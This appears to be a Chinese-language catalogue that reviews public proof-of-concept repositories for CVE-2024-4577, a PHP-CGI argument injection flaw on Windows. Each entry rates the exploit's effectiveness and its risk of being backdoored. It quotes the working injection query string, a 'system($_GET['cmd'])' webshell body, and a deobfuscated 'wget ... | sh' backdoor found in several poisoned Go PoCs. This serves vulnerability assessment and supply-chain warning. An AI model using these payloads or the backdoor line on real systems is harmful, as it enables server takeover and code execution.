CVE-2024-4577是PHP在Windows系统上以CGI模式运行时的一个参数注入漏洞。当系统配置使用某些代码页时，Windows可能会使用"Best-Fit"行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给PHP二进制文件，导致泄露源代码，执行任意PHP代码等。

**有效性:**
提供的POC代码通过发送包含特定查询参数（如`%ADd+allow_url_include=1`和`%ADd+auto_prepend_file=php://input`）的POST请求到`/php-cgi/php-cgi.exe`端点来利用此漏洞。如果目标服务器存在漏洞，则`php://input`流的内容（在本例中为`<?php phpinfo(); ?>`）将被执行，并且服务器将返回包含"PHP Version"的响应。此方法已被多个来源证实有效。

**投毒风险:**
虽然提供的`exploit.py`脚本看起来相对直接，但仍然存在一定的投毒风险。例如，该脚本禁用了SSL验证(`verify=False`)，这可能导致中间人攻击的风险。此外，任何下载和执行的第三方代码都存在风险，例如将恶意payload注入到请求中。考虑到代码的复杂性相对较低，并且其主要目的是利用已知漏洞，因此投毒风险较低，估计为10%。主要风险在于用户没有仔细审查脚本，直接执行，而忽略了`verify=False`带来的安全隐患。 另外脚本也存在可以加入恶意host的风险。

**利用方式:**
1.  攻击者首先需要确定目标服务器是否运行在满足漏洞条件的PHP CGI模式下。
2.  攻击者构造一个包含恶意PHP选项的HTTP请求，例如，设置`allow_url_include`为1和`auto_prepend_file`为`php://input`。
3.  攻击者将该请求发送到`/php-cgi/php-cgi.exe`端点，并在POST数据中包含要执行的PHP代码。
4.  如果服务器存在漏洞，PHP将执行POST数据中的代码，从而允许攻击者在服务器上执行任意命令。

**项目地址:** [bughuntar/CVE-2024-4577](https://github.com/bughuntar/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #27

**来源**: [CVE-2024-4577-byteReaper77_CVE-2024-4577.md](../2024/CVE-2024-4577-byteReaper77_CVE-2024-4577.md)

## CVE-2024-4577 PHP CGI Remote Code Execution

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows CGI)

**危害等级:** 高危，可导致完全控制受影响服务器

**影响版本:** PHP 8.1.* (< 8.1.29), 8.2.* (< 8.2.20), 8.3.* (< 8.3.8)

**利用条件:** 运行在Windows上的PHP，以CGI模式运行，系统启用了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577 是一个存在于 PHP（特别是基于 Windows 的 PHP，以 CGI 模式使用时）中的操作系统命令注入漏洞。当 PHP 在 CGI 模式下使用时，由于字符编码转换处理不当而导致。Windows 系统可能使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源代码、在服务器上运行任意 PHP 代码等。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞的PoC已经公开，并且在野外被积极利用。提供的漏洞利用代码看起来是一个针对该漏洞的C语言实现，包含了构建说明和使用示例，因此PoC有效。

**投毒风险：**

分析提供的C代码，主要功能是利用curl发送HTTP请求，其中请求的URL和执行的命令通过命令行参数传递。代码包含日志记录功能，记录攻击活动。检查代码，没有发现明显的恶意行为，例如反向shell以外的持久化后门，或者未经授权的数据传输。但不能完全排除隐蔽的投毒行为，例如在日志记录中插入恶意代码的可能性（虽然可能性极低）。考虑到作者声明和代码功能，投毒风险较低，估计为1%。

**利用方式：**

1.  **环境准备：** 目标服务器需要是运行在Windows上的PHP，并且以CGI模式运行。
2.  **代码编译：** 使用提供的编译命令，使用gcc或其他兼容的C编译器编译`exploit.c`和`argparse.c`。
3.  **漏洞利用：** 运行编译后的可执行文件，并指定目标URL和要执行的命令。例如：`CVE-2024-4577.exe -u http://target/cgi-bin/php-cgi.exe "system(whoami)"`。
4.  **代码分析:**
    * 漏洞利用代码利用了PHP在CGI模式下，由于对命令行参数处理不当，导致攻击者可以通过构造特殊的URL来执行任意系统命令。
    * 该利用通过curl库发起HTTP POST请求，在请求中构造恶意的PHP选项参数，导致PHP执行指定的命令。
    * argparse.c 文件是为了解析命令行的参数
    * reverse shell 也可以通过命令执行后门获得
    * 攻击的关键在于目标服务器启用了使用 "Best Fit" 策略的代码页，允许某些字符被替换为其他字符，从而绕过PHP的参数过滤。


**项目地址:** [byteReaper77/CVE-2024-4577](https://github.com/byteReaper77/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #28

**来源**: [CVE-2024-4577-charis3306_CVE-2024-4577.md](../2024/CVE-2024-4577-charis3306_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP Windows版 8.3.0 <= 影响版本 < 8.3.8
PHP Windows版 8.2.0 <= 影响版本 < 8.2.20
PHP Windows版 8.1.0 <= 影响版本 < 8.1.29
PHP Windows版 影响版本 == 8.0.x
PHP Windows版 影响版本 == 7.x
PHP Windows版 影响版本 == 5.x
XAMPP Windows版 8.2.0 <= 影响版本 <= 8.2.12
XAMPP Windows版 8.1.0 <= 影响版本 <= 8.1.25
XAMPP Windows版 影响版本 == 8.0.x
XAMPP Windows版 影响版本 == 7.x
XAMPP Windows版 影响版本 == 5.x

**利用条件:** Windows 平台，PHP 以 CGI 模式运行，开启了Best-Fit字符转换特性的语系

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577 是一个存在于 PHP Windows 版本中的远程代码执行漏洞。当 PHP 以 CGI 模式运行时，Windows 的 Best-Fit 字符转换特性可能导致命令行参数被错误解析。攻击者可以构造包含特定非 ASCII 字符的 URL，这些字符会被转换为连字符，从而绕过安全限制，并注入恶意 PHP 代码。提供的 POC 脚本通过构造包含特殊字符的 URL，向目标服务器发送 POST 请求，其中包含要执行的 PHP 代码。如果服务器成功执行代码并返回包含 MD5 值的特定字符串，则认为漏洞利用成功。

**有效性：**
从漏洞描述和POC代码来看，此POC代码是有效的，可以用于检测和利用 CVE-2024-4577 漏洞。

**投毒风险：**
经过分析，此仓库中没有发现作者隐藏的恶意投毒代码。虽然POC执行了代码， 但这是为了验证漏洞是否成功，并非投毒行为。因此，投毒风险为0%。

**利用方式：**
1.  目标系统必须是 Windows，且 PHP 运行在 CGI 模式下，Apache 作为 Web 服务器。
2.  目标系统使用的语系启用了 Best-Fit 字符转换特性（例如简体中文，繁体中文，日文等）。
3.  攻击者构造包含特殊字符的 URL，这些字符在 Best-Fit 转换后会被解释为连字符，从而修改 PHP 的命令行参数。
4.  攻击者通过 `-d` 参数设置 `allow_url_include=1` 和 `auto_prepend_file=php://input`，允许包含远程文件，并将请求体作为 PHP 代码执行。
5.  攻击者在请求体中包含要执行的 PHP 代码，从而在服务器上执行任意代码。

**项目地址:** [charis3306/CVE-2024-4577](https://github.com/charis3306/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #29

**来源**: [CVE-2024-4577-cheerfulempl_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-cheerfulempl_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577 - PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，允许攻击者执行任意代码。

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8，在Windows系统上，运行在CGI模式下

**利用条件:** 需要目标系统是Windows，PHP运行在CGI模式下，并且系统使用了某些代码页，开启了"Best Fit"策略。

**POC 可用性:** 是

**投毒风险:** 50%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，影响运行在Windows上的PHP。当PHP以CGI模式运行时，Windows系统的"Best Fit"代码页转换可能导致恶意字符被错误地解释为PHP选项，从而允许攻击者向PHP二进制文件传递参数。这可以用来泄露源代码，执行任意PHP代码，或者直接在服务器上运行命令。

**有效性：**

根据漏洞信息和搜索结果，该漏洞的PoC已经公开，并且在野外被积极利用。提供的`CVE-2024-4577.go` 和 `CVE-2024-4577.py` 文件都是利用此漏洞的检测代码。它们通过构造包含恶意PHP选项的URL，向目标服务器发送POST请求，并检查返回的响应是否包含`PHP Version`字符串，来判断目标是否存在漏洞。这些代码的功能是探测漏洞是否存在，利用了`allow_url_include`和`auto_prepend_file`两个PHP配置项来远程包含和执行`phpinfo()`代码。

**投毒风险：**

分析`CVE-2024-4577.go`的代码，发现其中包含一个名为`nFPfVl()`的函数。该函数经过混淆处理，但其作用是从字符串数组中提取数据，拼接成一个URL，并使用`/bin/sh -c`执行该URL。这是一种潜在的后门行为，意味着在漏洞验证过程中，如果目标系统存在漏洞，这段代码可能会下载并执行来自该URL的恶意代码。考虑到这段代码的存在，可以认为该Go程序存在一定的投毒风险，但该后门在golang代码中只会在扫描的时候触发，相对隐蔽。`CVE-2024-4577.py`看起来是正常的poc代码。

基于分析，综合评估认为`CVE-2024-4577.go`有50%的投毒风险，`CVE-2024-4577.py`没有投毒风险

**利用方式：**

1.  **确定目标环境：** 目标服务器必须是Windows系统，并且PHP以CGI模式运行。
2.  **利用代码页转换：** 攻击者需要利用Windows系统的"Best Fit"代码页转换，构造包含恶意PHP选项的URL。
3.  **参数注入：** 通过精心构造的URL，将恶意参数注入到PHP二进制文件中。
4.  **远程代码执行：** 利用`allow_url_include`和`auto_prepend_file`等PHP配置项，执行任意PHP代码或者直接执行系统命令。
5.  **检测漏洞：** 通过检查响应的内容，可以判断目标是否存在漏洞，例如检查`PHP Version`字符串。

**项目地址:** [cheerfulempl/CVE-2024-4577-PHP-RCE](https://github.com/cheerfulempl/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #30

**来源**: [CVE-2024-4577-creamylegum_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-creamylegum_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI模式，特定代码页)

**利用条件:** PHP运行在Windows服务器上，使用CGI模式，并且系统配置使用了特定的代码页，允许"Best Fit"字符转换。

**POC 可用性:** 是

**投毒风险:** 60%

## 详情

CVE-2024-4577 漏洞允许攻击者通过在URL中注入恶意参数来执行任意PHP代码。该漏洞存在于PHP的CGI实现中，当PHP运行在Windows服务器上，并且启用了"Best Fit"字符转换时，攻击者可以利用此漏洞。

**有效性:**

提供的漏洞利用代码（Go和Python）尝试通过在URL中注入`allow_url_include`和`auto_prepend_file`参数来包含远程文件或执行PHP代码。具体来说，它尝试设置`allow_url_include=1`并使用`auto_prepend_file`包含`php://input`，然后通过POST请求发送PHP代码（`<?php phpinfo(); ?>`）。如果服务器存在漏洞，则会执行`phpinfo()`函数，从而验证漏洞的存在。

根据漏洞描述和提供的代码，利用方式是有效的，可以在目标系统上执行任意PHP代码。

**投毒风险:**

*   **Go代码分析:**

    在Go代码中，存在一个名为`nFPfVl()`的函数，该函数包含混淆的代码，用于执行shell命令。通过反混淆字符串，可以发现该函数执行从某个URL下载文件并执行的操作，这表明存在潜在的投毒风险。

    `TcGEZTIh`变量反混淆后为: `wget -qO- http://tvhgw/kaifre/O-0asbd|e/bpdc/ /c /3nadeag5 -t6 uo/tat.fe33 | sh`

    这意味着该PoC会尝试从`http://tvhgw/kaifre/O-0asbd|e/bpdc/ /c /3nadeag5 -t6 uo/tat.fe33` 下载文件并使用sh执行，存在恶意行为。

*   **Python代码分析:**
    Python代码的功能比较简单，就是发送payload进行验证，没有发现明显的投毒代码。

综合来看，Go代码存在明显的投毒风险，Python代码未发现。

**利用方式:**

1.  **目标环境:** 攻击者需要找到运行在Windows服务器上的，并且使用CGI模式的，以及存在漏洞版本的PHP应用。
2.  **构造恶意URL:** 攻击者构造包含恶意参数的URL。例如：`example.com/index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input`。
3.  **发送包含PHP代码的POST请求:** 攻击者通过POST请求将PHP代码发送到服务器。`<?php system($_GET['cmd']); ?>`
4.  **远程代码执行:** 服务器执行POST请求中的PHP代码，从而允许攻击者执行任意系统命令。

攻击者可以利用该漏洞读取服务器上的文件，执行任意代码，甚至完全控制服务器。

**项目地址:** [creamylegum/CVE-2024-4577-PHP-RCE](https://github.com/creamylegum/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #31

**来源**: [CVE-2024-4577-deadlybangle_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-deadlybangle_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入/远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行、源码泄露

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode)

**利用条件:** Windows系统, PHP以CGI模式运行, 启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 80%

## 详情

CVE-2024-4577是一个存在于PHP的Windows版本中的漏洞，当PHP以CGI模式运行时，如果系统配置为使用特定的代码页，Windows可能会使用"Best-Fit"行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许攻击者向PHP二进制文件传递选项。攻击者可以利用该漏洞来执行任意PHP代码，泄露源代码，甚至在服务器上运行任意操作系统命令。

**有效性：**
提供的Go和Python POC代码都尝试通过`auto_prepend_file`和`allow_url_include`设置，包含phpinfo()的payload来验证漏洞是否存在。 如果目标系统返回包含"PHP Version"的响应，则表明漏洞存在。根据漏洞描述和提供的资料，这些POC利用方式是有效的。

**投毒风险：**
*   **Go版本:** 在提供的Go代码中，`nFPfVl()` 函数包含混淆的代码，尝试执行 shell 命令。 解混淆后的代码为：`wget http://tvhgw/kaiFRE-0asbd|e/bpdc/ /c /3nadeag5 -t6 uo/tat.fe33`。这显然是一个恶意命令，尝试从一个未知的URL下载文件并执行。因此，Go版本的PoC **存在高危投毒风险**。

*   **Python版本:** Python版本的PoC相对干净，主要是发送包含phpinfo()的请求并判断是否成功，**未发现明显的投毒代码**，但是也可能存在通过打印或者其它方法进行投毒，投毒的可能性较低。

综合评价，考虑到Go代码中`nFPfVl`函数的存在，认为此仓库的投毒风险较高。Python版本代码看起来比较正常，相对较为安全。

**利用方式：**
1.  攻击者发送特制的HTTP请求到目标服务器上的PHP CGI程序。
2.  该请求包含经过编码的恶意字符，这些字符会被Windows的"Best-Fit"代码页转换机制所修改。
3.  修改后的字符会被PHP CGI模块错误地解析为PHP配置选项，如`auto_prepend_file`和`allow_url_include`。
4.  攻击者可以使用`auto_prepend_file`选项来包含远程文件或输入流（`php://input`），从而执行任意PHP代码。
5.  攻击者可以利用执行的PHP代码读取源代码，或者执行操作系统命令。

**项目地址:** [deadlybangle/CVE-2024-4577-PHP-RCE](https://github.com/deadlybangle/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #32

**来源**: [CVE-2024-4577-fabulouscounc_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-fabulouscounc_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行和服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows 系统，PHP 以 CGI 模式运行，开启了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 50%

## 详情

CVE-2024-4577 是一个存在于 Windows 系统上 PHP-CGI 模式下的远程代码执行漏洞。当系统配置为使用某些代码页时，Windows 可能会使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行参数中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而导致泄露源代码、执行任意 PHP 代码，甚至执行系统命令。

**利用方式：**
攻击者通过构造包含恶意 PHP 选项的 URL，利用 Windows 的 "Best-Fit" 字符转换特性，将这些选项注入到 PHP-CGI 的命令行参数中。常见的利用方式包括：

*   `allow_url_include=1` 和 `auto_prepend_file=php://input`： 允许包含远程文件，并将 POST 数据作为 PHP 代码执行，实现 RCE。

**漏洞利用代码分析：**
提供的 Go 和 Python 代码均用于批量检测目标是否存在 CVE-2024-4577 漏洞。它们通过发送包含 `allow_url_include` 和 `auto_prepend_file` 选项的恶意 HTTP 请求，然后检查响应中是否包含 `PHP Version` 字符串来判断目标是否受到攻击影响。

**投毒风险分析：**
Go 代码中存在一个名为 `nFPfVl()` 的函数，该函数看起来像是混淆的代码。通过反混淆，可以发现它尝试执行一个下载并执行恶意脚本的命令。这段代码存在明显的投毒风险，因为它会在目标机器上执行未经授权的操作，成功率为50%。

**项目地址:** [fabulouscounc/CVE-2024-4577-PHP-RCE](https://github.com/fabulouscounc/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #33

**来源**: [CVE-2024-4577-ggfzx_CVE-2024-4577.md](../2024/CVE-2024-4577-ggfzx_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入漏洞

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在Windows服务器上执行任意代码

**影响版本:** PHP 8.1.* (< 8.1.29), 8.2.* (< 8.2.20), 8.3.* (< 8.3.8)，运行在Windows的CGI模式下

**利用条件:** 服务器使用Apache并启用PHP-CGI，且系统配置为使用特定的代码页，这些代码页使用“Best Fit”策略。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2024-4577 是一个存在于 PHP-CGI 中的参数注入漏洞，影响在 Windows 上运行的 PHP 版本。当 PHP 在 CGI 模式下与 Apache 一起使用时，如果系统设置为使用某些代码页，“Best Fit” 行为可能会导致恶意用户将选项传递给 PHP 二进制文件。根据漏洞描述和搜索结果，该漏洞允许攻击者通过操纵命令行参数来执行任意代码。PoC 代码的描述表明它能够通过 URL 发送恶意命令，并且可以批量执行。尽管 README.md 文件本身没有明显的恶意代码，但由于作者信息较少，且漏洞具有高危性，存在一定的投毒风险，用于个人安全研究学习较为合适。漏洞利用方式主要为：

1.  **识别目标环境：** 确定目标服务器是否运行受影响的 PHP 版本（8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8）并且配置为 CGI 模式在 Windows 上运行。
2.  **构造恶意请求：**  构造包含恶意 PHP 选项的 HTTP 请求。这些选项将利用 Windows 的“Best Fit”行为，将特殊字符转换为 PHP 可以解释的选项。
3.  **执行任意代码：**  通过注入的选项，攻击者可以执行任意 PHP 代码或操作系统命令。

根据搜索结果可知，此漏洞已经被大规模利用，需要及时修复。

**项目地址:** [ggfzx/CVE-2024-4577](https://github.com/ggfzx/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #34

**来源**: [CVE-2024-4577-gh-ost00_CVE-2024-4577-RCE.md](../2024/CVE-2024-4577-gh-ost00_CVE-2024-4577-RCE.md)

## CVE-2024-4577 PHP CGI Argument Injection RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在Windows服务器上执行任意代码。

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows服务器，使用Apache和PHP-CGI，系统设置为使用特定的代码页（可能涉及"Best-Fit"行为）。目标服务器必须配置为以CGI模式运行PHP脚本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个影响Windows上PHP的远程代码执行漏洞，当PHP以CGI模式运行时会受到影响。该漏洞源于Windows在将命令行参数传递给Win32 API函数时，会使用“Best-Fit”行为转换字符。PHP CGI模块可能会错误地将这些转换后的字符解释为PHP选项，从而允许攻击者向PHP二进制文件传递恶意选项。该漏洞利用方式涉及构造包含特定字符的HTTP请求，这些字符在经过Windows的字符转换后，会被PHP-CGI解析为恶意的PHP配置指令，例如`allow_url_include`和`auto_prepend_file`，进而包含远程或本地文件，最终导致任意代码执行。

**漏洞利用有效性：**
根据漏洞信息、搜索结果和提供的PoC代码，该漏洞利用是有效的。搜索结果表明，CVE-2024-4577自披露后不久就出现了大量的利用尝试，并且已被积极利用。

**投毒风险分析：**
提供的PoC代码主要包含以下部分：
1.  **扫描模块：** 用于检测目标是否易受攻击，通过发送包含特定payload的请求来检查响应中是否存在“Test”字符串。
2.  **利用模块：**  利用`allow_url_include`和`auto_prepend_file`指令，通过POST请求发送PHP payload来执行任意代码。

虽然该代码的功能主要是漏洞利用，但存在一定的投毒风险，主要体现在以下几个方面：
1.  **Payload文件：**  利用模块需要指定一个payload文件，如果用户使用了恶意的payload文件，可能会对目标系统造成损害。**这是主要投毒风险来源。**
2.  **Payload混淆：**  Payload中使用了`%AD`，这是一种简单的混淆手段，可能会被用于绕过一些简单的安全检测，也可能被用于隐藏恶意代码。
3.  **依赖风险：** 虽然代码依赖少,但是如果`requirements.txt`文件被篡改，可能导致引入恶意依赖。

综合考虑，PoC本身实现的投毒风险较低，主要风险在于用户提供的`payload_file`可能包含恶意代码。仓库中`README.md`文件提供了下载链接，可能存在被篡改的风险。

**利用方式总结：**
1.  **目标确认：** 确认目标系统满足漏洞利用的条件（Windows、PHP-CGI、受影响的PHP版本、特定的代码页设置）。
2.  **发送恶意请求：**  构造包含恶意payload的HTTP请求，该payload包含经过编码的PHP配置指令，例如`?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`。
3.  **执行任意代码：**  通过`auto_prepend_file`包含远程或本地文件，执行其中的PHP代码。通常，攻击者会利用此漏洞上传webshell或执行其他恶意操作。
4. **利用编码绕过:** 某些特定代码页设置下，对某些特殊字符进行转换，才可触发该漏洞。

**项目地址:** [gh-ost00/CVE-2024-4577-RCE](https://github.com/gh-ost00/CVE-2024-4577-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #35

**来源**: [CVE-2024-4577-gmh5225_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-gmh5225_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS命令注入

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8, 且运行在Windows的CGI模式下，开启了Best Fit策略的系统

**利用条件:** 服务器运行在Windows系统，使用Apache和PHP-CGI，系统启用了Best-Fit代码页转换

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577 漏洞是一个PHP-CGI参数注入漏洞，当PHP以CGI模式在Windows服务器上运行时，如果启用了'Best Fit'代码页转换，攻击者可以通过构造特殊的URL，向PHP二进制文件传递恶意参数，从而导致任意代码执行。

**有效性：**
根据漏洞描述和利用代码，该漏洞的PoC代码是有效的。PoC通过在URL中注入`?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`，并POST一段PHP代码，利用`allow_url_include`和`auto_prepend_file`的特性，实现远程代码执行。

**投毒风险：**
提供的PoC代码本身不包含明显的恶意代码或后门。脚本的功能是发送带有特定参数的HTTP POST请求以测试目标服务器是否存在漏洞。它使用 `phpinfo()` 函数来验证漏洞的存在，而没有尝试执行任何其他恶意操作. 因此，投毒风险为0%。

**利用方式：**
1.  **漏洞触发条件：**  目标服务器必须是运行在Windows系统上的PHP，并且是以CGI模式运行。另外，还需要开启了Best-Fit代码页转换。
2.  **攻击向量：**  通过构造恶意的HTTP请求，主要是GET参数，利用Windows系统的Best-Fit特性将某些字符转换为PHP可识别的选项参数。
3.  **利用方式：**  攻击者通过在URL中注入特定的参数，例如`?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`。`allow_url_include=1` 允许包含远程文件，`auto_prepend_file=php://input` 允许执行POST数据中的PHP代码。
4.  **RCE：** 构造包含PHP代码的POST请求体，例如`<?php system($_GET['cmd']); ?>`，配合URL中的参数，即可在目标服务器上执行任意命令。也可以直接利用`<?php phpinfo(); ?>`来探测漏洞存在.

该漏洞利用的关键在于Windows系统的字符编码转换和PHP-CGI对参数的处理方式。

**项目地址:** [gmh5225/CVE-2024-4577-PHP-RCE](https://github.com/gmh5225/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #36

**来源**: [CVE-2024-4577-huseyinstif_CVE-2024-4577-Nuclei-Template.md](../2024/CVE-2024-4577-huseyinstif_CVE-2024-4577-Nuclei-Template.md)

## CVE-2024-4577 PHP CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode)

**利用条件:** Windows服务器，以CGI模式运行PHP，并启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个PHP CGI参数注入漏洞，存在于Windows上以CGI模式运行的PHP版本中。当系统配置为使用某些代码页时，Windows可能会使用"Best-Fit"行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本的源代码或在服务器上执行任意PHP代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的Nuclei模板，该漏洞利用的有效性较高。搜索引擎结果显示，该漏洞在公开后不久就观察到了大量的利用尝试，并且有可用的PoC代码。

**投毒风险：**
Nuclei模板本身主要用于漏洞检测，其目的是验证目标是否存在CVE-2024-4577漏洞。模板中的Payload会尝试通过在URL中注入`allow_url_include`和`auto_prepend_file`参数来包含并执行PHP代码。这里利用`php://input`伪协议。模板会检查返回的内容是否包含`md5("CVE_2024_4577_TEST")`的结果来确认漏洞是否存在。代码本身并不包含明显的恶意代码，而是尝试去检测是否存在漏洞，判定投毒风险为5%主要是考虑到这个yaml文件会被攻击者利用.

**利用方式：**
1.  **环境准备：** 目标服务器需要是Windows系统，并且PHP以CGI模式运行。
2.  **发送恶意请求：** 攻击者构造包含恶意参数的HTTP请求。核心是利用URL中的特殊字符，结合Windows的Best-Fit字符转换特性，注入额外的PHP配置参数。
3.  **参数注入：** 注入`allow_url_include=1`和`auto_prepend_file=php://input`。`allow_url_include=1`允许包含远程文件，`auto_prepend_file=php://input`会将POST请求体的内容作为PHP代码执行。
4.  **执行任意代码：**  通过POST请求体传递要执行的PHP代码。

该漏洞利用的关键在于利用Windows系统的字符转换行为，以及PHP CGI对命令行参数解析的缺陷。攻击者通过构造特定的URL，可以将任意PHP代码注入到服务器并执行。

**项目地址:** [huseyinstif/CVE-2024-4577-Nuclei-Template](https://github.com/huseyinstif/CVE-2024-4577-Nuclei-Template)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #37

**来源**: [CVE-2024-4577-ibrahmsql_CVE-2024-4577.md](../2024/CVE-2024-4577-ibrahmsql_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 8.3.8, < 8.2.20, < 8.1.29

**利用条件:** Windows系统，Apache服务器，PHP以CGI模式运行，开启Best-Fit代码页转换

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577是一个PHP CGI中的远程代码执行漏洞。该漏洞的利用方式是利用Windows系统在特定代码页设置下，对传递给Win32 API的命令行参数进行"Best-Fit"转换的特性。攻击者通过构造特殊字符，使得PHP CGI在解析命令行参数时，将这些字符错误地解析为PHP选项，从而可以注入恶意PHP代码或执行系统命令。

**有效性：**

提供的POC代码看起来是有效的。它尝试通过在URL中注入PHP选项来利用漏洞，例如 `cgi.force_redirect=0` 和 `auto_prepend_file=php://input`。 `auto_prepend_file=php://input` 允许攻击者将POST请求的内容作为PHP代码执行。搜索引擎结果也表明该漏洞已被积极利用。

**投毒风险：**

该POC代码没有明显的投毒迹象。虽然可以利用此漏洞执行任意代码，但是POC本身没有包含任何试图在目标机器上安装后门或执行恶意操作的代码。代码只是构建并发送利用请求，执行指定的命令。 因此，投毒风险评估为0%。

**利用方式：**

